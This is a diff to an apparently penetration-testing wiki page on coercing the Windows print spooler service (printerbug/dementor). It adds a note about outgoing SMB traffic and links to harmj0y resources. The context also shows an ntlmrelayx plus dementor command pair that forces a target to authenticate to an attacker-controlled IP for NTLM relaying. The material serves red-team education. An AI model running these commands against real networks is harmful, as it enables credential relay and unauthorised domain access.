@@ -14,6 +14,8 @@ Remotely checking if the spooler is available can be done with [SpoolerScanner](
 
 The spooler service can be triggered with [printerbug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) \(Python\), [dementor](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc) \(Python\), the adapted original .NET code \([here](https://github.com/leechristensen/SpoolSample)\).
 
+This trigger leads to an outgoing traffic using SMB.
+
 {% tabs %}
 {% tab title="dementor" %}
 Trigger the spooler service
@@ -56,4 +58,10 @@ In the situation where the tester doesn't have any credentials, it is still poss
 ntlmrelayx.py -t smb://$TARGET -socks
 proxychains dementor.py -d $DOMAIN -u $DOMAIN_USER $ATTACKER_IP $TARGET
 ```
+
+## Resources
+
+{% embed url="https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/" %}
+
+{% embed url="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory/41" %}
 
